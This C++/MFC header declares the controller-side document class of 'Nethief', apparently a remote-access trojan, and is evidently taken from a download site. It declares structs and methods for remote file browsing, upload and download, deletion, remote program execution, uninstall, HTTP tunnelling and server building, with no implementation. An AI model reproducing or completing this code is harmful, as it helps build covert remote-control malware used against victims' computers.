//Download by http://www.NewXing.com
// NethiefDoc.h : interface of the CNethiefDoc class
#include "MainFrm.h"
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_)
#define AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000
//�����еĴ��������ŵ�CNethiefDoc����,�Է��㴦��

//*************************************
#pragma pack(1) //�ֽڶ���

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strClientName;
	BOOL			bIsHttpTunnel;
}
NOTIFY_CLIENT_CONNECT_THREAD_PARAM,*pNOTIFY_CLIENT_CONNECT_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
EXPAND_DIRECTORY_THREAD_PARAM,*pEXPAND_DIRECTORY_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
SHOW_FILELIST_THREAD_PARAM,*pSHOW_FILELIST_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
	CString			strFilename1;
	CString			strFilename2;
}
RENAME_FILE_THREAD_PARAM,*pRENAME_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFullFilename;
}
NEW_FILE_THREAD_PARAM,*pNEW_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFullFilename;
}
NEW_FOLDER_THREAD_PARAM,*pNEW_FOLDER_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
}
DELETE_FILE_THREAD_PARAM,*pDELETE_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
	CString			strTo;
	DWORD			dwFOFlags;
}
REMOTE_PASTE_THREAD_PARAM,*pREMOTE_PASTE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
}
GET_OPERATION_OBJECT_THREAD_PARAM,*pGET_OPERATION_OBJECT_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename1;
	CString			strFilename2;
	DWORD			dwStartPosition;
	BOOL			bIsCut;
}
DOWNLOAD_FILE_THREAD_PARAM,*pDOWNLOAD_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename1;
	CString			strFilename2;
	DWORD			dwStartPosition;
	BOOL			bIsCut;
}
UPLOAD_FILE_THREAD_PARAM,*pUPLOAD_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
SHOW_PROPERTY_MULTI_THREAD_PARAM,*pSHOW_PROPERTY_MULTI_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
}
SHOW_PROPERTY_SINGLE_THREAD_PARAM,*pSHOW_PROPERTY_SINGLE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
	DWORD			dwFileAttributes;
}
MODIFY_PROPERTY_SINGLE_THREAD_PARAM,*pMODIFY_PROPERTY_SINGLE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strDiskDrive;
}
SHOW_PROPERTY_DISKDRIVE_THREAD_PARAM,*pSHOW_PROPERTY_DISKDRIVE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strDiskDrive;
	CString			strVolumeName;
}
MODIFY_PROPERTY_DISKDRIVE_THREAD_PARAM,*pMODIFY_PROPERTY_DISKDRIVE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
	CString			strParam;
	int				nShowCmd;
}
REMOTE_RUN_THREAD_PARAM,*pREMOTE_RUN_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
}
REMOTE_UNINSTALL_THREAD_PARAM,*pREMOTE_UNINSTALL_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFindDir;
	CString			strFindFile;
	BOOL			bSearchSubdir;
}
FIND_FILE_THREAD_PARAM,*pFIND_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
}
SHOW_NOTE_THREAD_PARAM,*pSHOW_NOTE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
}
GET_FILE_INFO_THREAD_PARAM,*pGET_FILE_INFO_THREAD_PARAM;

#pragma pack()	//ʹ��ȱʡ����
//*************************************
UINT NotifyClientConnectProc(LPVOID pParam);			//֪ͨ����˿�ʼ����
UINT Command_IDVerifyProc(LPVOID pParam);				//����������֤
UINT Command_DownloadDiskDriveInfoProc(LPVOID pParam);	//���ط������Ϣ
UINT Command_ExpandDirectoryProc(LPVOID pParam);
UINT Command_ShowFileListProc(LPVOID pParam);
UINT Command_RenameFileProc(LPVOID pParam);
UINT Command_NewFileProc(LPVOID pParam);
UINT Command_NewFolderProc(LPVOID pParam);
UINT Command_DeleteFileProc(LPVOID pParam);
UINT Command_RemotePasteProc(LPVOID pParam);
UINT Command_GetOperationObjectProc(LPVOID pParam);
UINT Command_DownloadFileProc(LPVOID pParam);
UINT Command_UploadFileProc(LPVOID pParam);
UINT Command_ShowPropertyMultiProc(LPVOID pParam);
UINT Command_ShowPropertySingleProc(LPVOID pParam);
UINT Command_ModifyPropertySingleProc(LPVOID pParam);
UINT Command_ShowPropertyDiskdriveProc(LPVOID pParam);
UINT Command_ModifyPropertyDiskdriveProc(LPVOID pParam);
UINT Command_RemoteRunProc(LPVOID pParam);
UINT Command_RemoteUninstallProc(LPVOID pParam);
UINT Command_FindFileProc(LPVOID pParam);
UINT Command_ShowNoteProc(LPVOID pParam);
UINT Command_GetFileInfoProc(LPVOID pParam);

class CNethiefDoc : public CDocument
{
protected: // create from serialization only
	CNethiefDoc();
	DECLARE_DYNCREATE(CNethiefDoc)

// Attributes
public:
	//*****************************************************************
	////////////////////////��Ա����/////////////////////////////
	CMainFrame*		m_pFrame;
	CMyTreeView*	m_pTreeView;
	CMyListView*	m_pListView;
	CTreeCtrl*		m_Tree;
	CListCtrl*		m_List;
	CStatusBar*		m_pStatusBar;//״̬��
//	CCommunity*		m_pCommunity;
	CFileSocket*	m_pFileSocket;

	CImageList		m_ListImageList;//�б�ӳ���б�(����ListView)
	CImageList		m_TreeImageList;//��ӳ���б�(����TreeView)
	HICON			m_hIcon_Folder;//�б�ӳ���б��ﳣ�õ��ļ���ͼ��
	HICON			m_hIcon_UnknownFile;//�б�ӳ���б��ﳣ�õ�δ֪�ļ�ͼ��

	CProgressCtrl	m_Progress;//״̬��������
	CStatic			m_Static_Offline;//״̬������״̬
	CStatic			m_Static_Busy;
	HICON			m_hIcon_Offline;
	HICON			m_hIcon_Busy;
	BOOL			m_bIsBusy;

	DWORD			m_dwFOFlags;
	CString			m_strFOHostName;
	HTREEITEM		m_hCutParentItem;
	DWORD			m_dwNewClipboardFormat;
	DWORD			m_dwClipboardDataSize;

	CString			m_strIndicatorStatus;
	BOOL			m_bIsOnline;
	BOOL			m_bLogoning;
	BOOL			m_bFlashIcon;
	int				m_nCount;
	int				m_nCount2;
	int				m_nCount3;
	CString			m_strServerNum;
	/////////////////////////////////////////////
	CWinThread*		m_pFileSocketThread;

	///////////�ͻ������ñ���////////////
	CString			m_strFileViewer;//���ڲ鿴�ļ����Զ������
	////////////////////////��Ա����/////////////////////////////
	void OnInitial();
	void OnClose();
	void OnTreeInitalUpdate();
	void OnListInitalUpdate();
	void OnListDestroy();
	//////////////////////////////////////////
	void AddDiskDriveToTree(HTREEITEM hItem);//��Ӵ�������������
	BOOL AddDoubleDeckSubdirectoryToDiskDriveItem(CString strDir,HTREEITEM hItem);//���˫����Ŀ¼�������������ڵ�
	void AddSubdirectoryToTree(CString strDir,HTREEITEM hItem);//�����Ŀ¼����
	void AddFileToList(CString strDir);//����ļ��б�List
	void AddHost(CString strItemName,BOOL bIsHttpTunnel);
	////////////////////////////////////////////
	void OnTreeItemexpanding(NM_TREEVIEW* pNMTreeView,LRESULT* pResult);
	void OnTreeSelchanged(NM_TREEVIEW* pNMTreeView,LRESULT* pResult);
	void OnTreeBeginlabeledit(TV_DISPINFO* pTVDispInfo,LRESULT* pResult);
	void OnTreeEndlabeledit(TV_DISPINFO* pTVDispInfo,LRESULT* pResult);
	void OnListEndlabeledit(LV_DISPINFO* pDispInfo, LRESULT* pResult);
	void OnListDblclk(NM_LISTVIEW* pNMListView,LRESULT* pResult);
	///////////////////////////////////////////
	void ChangeDirectoryItem(CString strDirName,CString strNewDirName);
	void SelectDirecoryItem(CString strDirName);
	void RefreshDirecoryItem(HTREEITEM hSelectItem);
	void UnsignCutDirecoryItem(BOOL bIsTree);
	void SignCutDirecoryItem(CString strDirName);
	void AddDirecoryItem(CString strDirName,HTREEITEM hSelectItem,BOOL bIsRefresh=FALSE);
	void DeleteDirecoryItem(CString strDirName);
	int FindDirectory(CString strDirName);
	void FindNewDirectory(HTREEITEM hSelectItem);
	void DeleteCutDirecoryItem();
	///////////////////////////////////////////
	CString ConverDWORDToCString(DWORDLONG dwSize);
	DWORDLONG GetDiskSpace(CString strDiskDriver,BOOL bFreeSpace);
	static int CALLBACK CompareFunc(LPARAM lParam1, LPARAM lParam2,LPARAM lParamSort);

	void SetCurDir(CString strCurHostName,CString strCurDir);
	CString GetCurDir();
	CString GetCurPath();
	CString GetCurHostName();

	void MessageErrorBox(int nErrorCode,CString strSubject,CString strFilename);
	void OnUpdateIndicatorProgress(CCmdUI *pCmdUI);
	BOOL CopyPathToClipboard(BOOL bIsTree);
	void SetFileOperationPath(CString* pstrPath);
	void FolderStatistic(CString strFindDir,int* nFileCount,
							 int* nFolderCount,DWORD* dwTotalSize);
	void GetOperationObject(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,CString strPath2,DWORD dwFOFlags);
	void SearchFile_GetOperationObject(CString strFindDir,int nPathLen,
		CByteArray* pArrayBuffer);
	void SearchFile(CString strFindDir,CString strFindFile,BOOL bSearchSubdir,
		CStringArray* pStringArray);

	void SetIndicatorRect();
	void SetOfflineSign();
	void FlashIcon();

	void OnTimer(UINT nIDEvent);
	void SetBusyCursor(BOOL bBusy);
	void SetIndicatorStatus(CString strIndicatorStatus);
	CString	CharToCString(char* cText,UINT nSize);
	CString GetHostName(HTREEITEM hItem);
	BOOL FindHost(CString strHostName,BOOL bIsHttpTunnel);
	//////////////////////////////////////////////////
	void OnToolbarNewfile();
	void OnToolbarNewfolder();
	void OnToolbarBack();
	void OnToolbarRefresh();
	void OnToolbarFindfile();
	void OnToolbarCut(BOOL bIsTree);
	void OnToolbarCopy(BOOL bIsTree);
	void OnToolbarPaste();
	void OnMenuFileRun();
	void OnToolbarRun();
	void OnTreeMenuFileRename();
	void OnListMenuFileRename();
	void OnToolbarView();
	void OnTreeToolbarDelete();
	void OnListToolbarDelete();
	void OnToolbarProperty(BOOL bIsTree);
	void OnToolbarSelectall();
	void OnToolbarReverseselect();
	void OnMenuConsoleLogon();
	void OnHelpUpdate();
	void OnToolbarBuildserver();
	void OnToolbarDeletehost();
	void OnToolbarDisconnect();
	void OnMenuNetUninstall();
	void OnMenuNetNote();
	void OnToolbarStop();
	void OnMenuNetOption();
	void OnMenuNetDownload();
	//////////////////////////////////////////////////
	int GetINIfileInt(LPCTSTR lpSectionName,  //��INI�ж�ȡ����ֵ
					  LPCTSTR lpKeyName);
	BOOL WriteINIfileInt(LPCTSTR lpSectionName, //��INI��д������ֵ
						 LPCTSTR lpKeyName,
						 INT nValue);
	CString GetINIfileString(LPCTSTR lpSectionName, //��INI�ж�ȡ�ַ�ֵ
							 LPCTSTR lpKeyName);
	BOOL WriteINIfileString(LPCTSTR lpSectionName,  //��INI��д���ַ�ֵ
							LPCTSTR lpKeyName,
							LPCTSTR lpString);
	//////////////////////////////////////////////////
	void ConnectHost(HTREEITEM hExpandItem);
	void Remote_ExpandDirectory(HTREEITEM hExpandItem,CString strHostName,CString strPath);
	void Remote_ShowFileList(HTREEITEM hSelectItem,CString strHostName,CString strPath);
	void Remote_RenameFile(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename1,CString strFilename2,
		BOOL bIsDir,BOOL bIsList,int nEditItem);
	void Remote_NewFile(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename);
	void Remote_NewFolder(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename);
	void Remote_DeleteFile(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,BOOL bIsList);
	void Remote_RemotePaste(CString strHostName,
		CString strFrom,CString strTo,DWORD dwFOFlags);
	void Remote_GetOperationObject(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,CString strPath2,DWORD dwFOFlags);
	void Remote_DownloadFile(CString strHostName,
		CString strFilename1,CString strFilename2,DWORD dwStartPosition,
		int nCurNum,int nTotalNum,BOOL bIsCut,int nControlCode);
	void Remote_UploadFile(CString strHostName,
		CString strFilename1,CString strFilename2,DWORD dwStartPosition,
		int nCurNum,int nTotalNum,BOOL bIsCut);
	void Remote_ShowProperty_Multi(CString strHostName,CString strPath);
	void Remote_ShowProperty_Single(CString strHostName,CString strFilename);
	void Remote_ModifyProperty_Single(CString strHostName,
		CString strFilename,DWORD dwFileAttributes);
	void Remote_ShowProperty_Diskdrive(HTREEITEM hSelectItem,
		CString strHostName,CString strDiskDrive);
	void Remote_ModifyProperty_Diskdrive(HTREEITEM hSelectItem,
		CString strHostName,CString strDiskDrive,CString strVolumeName);
	void Remote_RemoteRun(CString strHostName,
		CString strFilename,CString strParam,int nShowCmd);
	void Remote_RemoteUninstall(CString strHostName);
	void Remote_FindFile(CString strHostName,CString strFindDir,
		CString strFindFile,BOOL bSearchSubdir);
	void Remote_ShowNote(CString strHostName);
	void Remote_GetFileInfo(CString strHostName,
		CString strFilename,BOOL bIsDownloadFile);
	//////////////////////////////////////////////////
	void OnSocketAccept();
	void OnTM_NotifyConnect(DWORD dwResult);
	void OnTM_IDVerify(DWORD dwResult);
	void OnTM_DownloadDiskDriveInfo(DWORD dwResult);
	void OnTM_ExpandDirectory(DWORD dwResult);
	void OnTM_ShowFileList(DWORD dwResult);
	void OnTM_RenameFile(DWORD dwResult);
	void OnTM_NewFile(DWORD dwResult);
	void OnTM_NewFolder(DWORD dwResult);
	void OnTM_DeleteFile(DWORD dwResult);
	void OnTM_RemotePaste(DWORD dwResult);
	void OnTM_GetOperationObject(DWORD dwResult);
	void OnTM_DownloadFile(DWORD dwResult);
	void OnTM_UploadFile(DWORD dwResult);
	void OnTM_ShowProperty_Multi(DWORD dwResult);
	void OnTM_ShowProperty_Single(DWORD dwResult);
	void OnTM_ModifyProperty_Single(DWORD dwResult);
	void OnTM_ShowProperty_Diskdrive(DWORD dwResult);
	void OnTM_ModifyProperty_Diskdrive(DWORD dwResult);
	void OnTM_RemoteRun(DWORD dwResult);
	void OnTM_RemoteUninstall(DWORD dwResult);
	void OnTM_FindFile(DWORD dwResult);
	void OnTM_ShowNote(DWORD dwResult);
	void OnTM_RefreshStatusBar(DWORD dwResult);
	void OnTM_GetFileInfo(DWORD dwResult);
	//*****************************************************************
private:
	//*****************************************************************
	////////////////////////��Ա����/////////////////////////////
	CString			m_strFileCacheDir;

	CString			m_strCurHostName;		//���浱ǰ������
	CString			m_strCurDir;			//���浱ǰĿ¼��·��
	CString			m_strExpandHostName;	//����չ��ʱ��������
	CString			m_strExpandPath;		//����չ��ʱ��·��

	HTREEITEM		m_hConnectHostItem;

	HTREEITEM		m_hExpandItem;			//����չ����Item
	HTREEITEM		m_hSelectItem;			//����ѡ���Item
	BOOL			m_bLastExpand;			//��ʾ�ļ��б��չ��
	CString			m_strIndicatorShowFileList;//�ļ��б��״̬����ʾ����
	//����OnTM_ExpandDirectory��////////
	BOOL			m_bLastSelect;			//չ�������ѡ����
	CString			m_strSelectName;		//��ѡ�е�������
	//����OnTM_RenameFile��////////
	HTREEITEM		m_TM_RenameFile_hEditItem;
	CString			m_TM_RenameFile_strFullPath;
	CString			m_TM_RenameFile_strFilename2;
	int				m_TM_RenameFile_nEditItem;
	BOOL			m_TM_RenameFile_bIsDir;
	BOOL			m_TM_RenameFile_bIsList;
	//����OnTM_NewFile��////////
	HTREEITEM		m_TM_NewFile_hSelectItem;
	CString			m_TM_NewFile_strFullPath;
	CString			m_TM_NewFile_strFilename;
	//����OnTM_NewFolder��////////
	HTREEITEM		m_TM_NewFolder_hSelectItem;
	CString			m_TM_NewFolder_strFullPath;
	CString			m_TM_NewFolder_strFilename;
	//����OnTM_DeleteFile��////////
	HTREEITEM		m_TM_DeleteFile_hSelectItem;
	CString			m_TM_DeleteFile_strFullPath;
	BOOL			m_TM_DeleteFile_bIsList;
	//����OnTM_RemotePaste��////////
	CString			m_TM_RemotePaste_strFullPath;
	//����OnTM_GetOperationObject��////////
	CString			m_TM_GetOperationObject_strRemoteHostName;
	HTREEITEM		m_TM_GetOperationObject_hSelectItem;
	CString			m_TM_GetOperationObject_strPath;
	CString			m_TM_GetOperationObject_strPath2;
	BOOL			m_TM_GetOperationObject_bIsCut;
	CString			m_TM_GetOperationObject_strFullPath;
	CStringArray	m_TM_GetOperationObject_StringArray;
	int				m_TM_GetOperationObject_nIndex;
	//����OnTM_DownloadFile��////////
	CString			m_TM_DownloadFile_strFilename2;
	BOOL			m_TM_DownloadFile_bIsCut;
	int				m_TM_DownloadFile_nControlCode;
	//����OnTM_UploadFile��////////
	BOOL			m_TM_UploadFile_bIsCut;
	//����OnTM_ShowProperty_Multi��////////
	CString			m_TM_ShowPropertyMulti_strHostName;
	//����OnTM_ShowProperty_Single��////////
	CString			m_TM_ShowPropertySingle_strHostName;
	CString			m_TM_ShowPropertySingle_strFilename;
	//����OnTM_ShowProperty_Diskdrive��////////
	HTREEITEM		m_TM_ShowPropertyDiskdrive_hSelectItem;
	CString			m_TM_ShowPropertyDiskdrive_strHostName;
	CString			m_TM_ShowPropertyDiskdrive_strFullPath;
	//����OnTM_ModifyProperty_Single��////////
	CString			m_TM_ModifyPropertySingle_strFullPath;
	//����OnTM_ModifyProperty_Diskdrive��////////
	HTREEITEM		m_TM_ModifyPropertyDiskdrive_hSelectItem;
	CString			m_TM_ModifyPropertyDiskdrive_strVolumeName;
	CString			m_TM_ModifyPropertyDiskdrive_strFullPath;
	//����OnTM_RemoteRun��////////
	CString			m_TM_RemoteRun_strFullPath;
	//����OnTM_GetFileInfo��////////
	BOOL			m_TM_GetFileInfo_bIsDownloadFile;

	////////////////////////��Ա����/////////////////////////////
	int ShowSelectFileOperationDialog(CString strFilename,//��ʾѡ���ļ������Ի���
		HICON hSourceIcon,CString strSourceFileInfo,
		HICON hDestIcon,CString strDestFileInfo,
		BOOL bDoNotContinue);
	BOOL IsFileExist(CString strFilename);//����ָ���ļ��Ƿ����
	//*****************************************************************


public:

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CNethiefDoc)
	public:
	virtual BOOL OnNewDocument();
	virtual void Serialize(CArchive& ar);
	//}}AFX_VIRTUAL

// Implementation
public:
	virtual ~CNethiefDoc();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

// Generated message map functions
protected:
	//{{AFX_MSG(CNethiefDoc)
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Developer Studio will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_)
